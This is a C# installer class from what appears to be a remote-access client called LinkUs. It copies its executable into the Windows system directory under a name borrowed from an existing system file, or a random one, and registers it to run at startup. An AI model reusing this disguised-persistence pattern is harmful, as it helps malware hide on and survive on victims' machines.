using System;
using System.IO;

namespace LinkUs.Client.Install
{
    public class Installer : IInstaller
    {
        private readonly IEnvironment _environment;
        private readonly IFileService _fileService;
        private readonly IRegistry _registry;

        // ----- Constructor
        public Installer(
            IEnvironment environment,
            IFileService fileService,
            IRegistry registry)
        {
            _environment = environment;
            _fileService = fileService;
            _registry = registry;
        }

        // ----- Public methods
        public string Install(string exeFile)
        {
            var currentInstalledApplicationPath = _registry.GetFileLocation();
            if (string.IsNullOrEmpty(currentInstalledApplicationPath)) {
                return ProcessInstall(exeFile);
            }

            if (string.Equals(currentInstalledApplicationPath, exeFile, StringComparison.InvariantCultureIgnoreCase)) {
                CheckInstall(exeFile);
                return currentInstalledApplicationPath;
            }

            var installedVersion = _fileService.GetAssemblyVersion(currentInstalledApplicationPath);
            var targetVersion = _fileService.GetAssemblyVersion(exeFile);
            if (installedVersion >= targetVersion) {
                throw new HigherVersionAlreadyInstalled(currentInstalledApplicationPath);
            }

            return ProcessInstall(exeFile);
        }
        public void Uninstall(string exeFile)
        {
            _registry.RemoveFileFromStartupRegistry(exeFile);
            _registry.ClearFileLocation();
        }
        public bool IsInstalled(string exeFile)
        {
            var parentDirectory = Path.GetDirectoryName(exeFile);
            return string.Equals(GetInstallationDirectory(), parentDirectory, StringComparison.CurrentCultureIgnoreCase);
        }
        public void CheckInstall(string exeFile)
        {
            if (_registry.IsRegisteredAtStartup(exeFile) == false) {
                _registry.AddFileToStartupRegistry(exeFile);
            }
            if (_registry.GetFileLocation() != exeFile) {
                _registry.SetFileLocation(exeFile);
            }
        }

        // ----- Internal logic
        private string ProcessInstall(string exeFile)
        {
            var fileName = _fileService.GetFileNameCopiedFromExisting(GetInstallationDirectory()) ?? _fileService.GetRandomFileName();
            var targetFilePath = Path.Combine(GetInstallationDirectory(), fileName);

            _fileService.Copy(exeFile, targetFilePath);
            _registry.AddFileToStartupRegistry(targetFilePath);
            _registry.SetFileLocation(targetFilePath);

            return targetFilePath;
        }
        private string GetInstallationDirectory()
        {
            // For 64bit operating system, when trying to copy file to
            // system32, it copies file in C:\WINDOWS\SysWOW64 because of
            // file redirector. (system32 directory contains only 64bit programs.)
            if (_environment.Is64Bit) {
                return Environment.GetFolderPath(Environment.SpecialFolder.SystemX86);
            }
            else {
                return Environment.GetFolderPath(Environment.SpecialFolder.System);
            }
        }
    }
}